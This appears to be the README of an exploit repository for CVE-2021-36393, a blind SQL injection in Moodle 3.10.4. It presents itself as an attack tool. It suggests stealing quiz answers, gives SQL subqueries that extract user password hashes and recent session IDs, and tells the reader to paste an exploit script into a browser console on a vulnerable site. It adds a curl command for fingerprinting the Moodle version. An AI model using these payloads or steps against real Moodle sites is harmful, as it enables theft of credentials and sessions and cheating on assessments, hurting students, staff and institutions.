### CVE-2021-36393

Error-based blind SQL injection with bit-shifting approach for Moodle 3.10.4.

Allows an attacker to perform arbitrary database queries. For example, you can steal:

- test answers from the database

  Modify the [`script.js`](script.js) file and run it on route `/mod/quiz/attempt.php?attempt=...&cmid=...`

- user password hashes:
  ```sql
  (SELECT password FROM mdl_user WHERE id = 2 LIMIT 1)
  ```

- user sessions:
  ```sql
  (SELECT sid FROM mdl_sessions ORDER BY id DESC LIMIT 1)
  ```

### How to use it?

You must be logged in and enrolled in at least one course. The just copy the [`script.js`](script.js) code into your
browser console and run it on a website that has the vulnerable version of Moodle installed.

### How to check the installed version of Moodle?

```bash
DOMAIN="example.com"
curl -s https://$DOMAIN/lib/upgrade.txt | head
```
